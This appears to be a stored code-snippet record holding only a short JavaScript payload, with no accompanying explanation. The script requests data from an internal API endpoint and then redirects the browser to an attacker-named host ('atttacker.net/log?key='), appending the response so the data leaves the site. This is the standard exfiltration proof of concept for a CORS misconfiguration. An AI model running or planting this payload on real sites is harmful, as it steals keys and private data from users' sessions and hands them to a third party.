---
id: 741dd0de-5501-411f-bf7d-64aa4775c401
type: code
language: js
verified: false
created_at: '2023-04-06T03:55:54.360052+00:00'
updated_at: '2023-04-06T03:55:54.363437+00:00'
---

# Code Snippet 741dd0de

**Language**: js

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.internal.example.com/endpoint',true); 
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText; 
};
```


